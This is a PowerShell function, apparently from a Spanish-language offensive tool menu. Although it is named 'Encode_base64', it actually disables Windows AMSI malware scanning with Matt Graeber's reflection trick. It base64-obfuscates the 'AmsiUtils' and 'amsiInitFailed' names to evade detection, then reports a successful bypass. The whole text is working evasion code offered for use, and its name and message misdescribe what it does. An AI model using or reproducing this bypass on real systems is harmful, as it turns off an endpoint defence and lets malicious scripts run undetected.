
function Encode_base64

{

    Write-Host "";
    Write-Host "Técnica original de Matt Graeber & Fabian Mosch ";
    Write-Host "https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#Using-Matt-Graebers-Reflection-method";
    Write-Host "";
    Write-Host -ForegroundColor Yellow "Codificando payload en base64...";
    try
    {
        [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
        Write-Host -ForegroundColor Yellow "[+] Bypass de AMSI completado";
    }
    catch
    {
        Write-host "Intente otra técnica para hacer el bypass de AMSI";
    }
    pause;
    Show_menu
}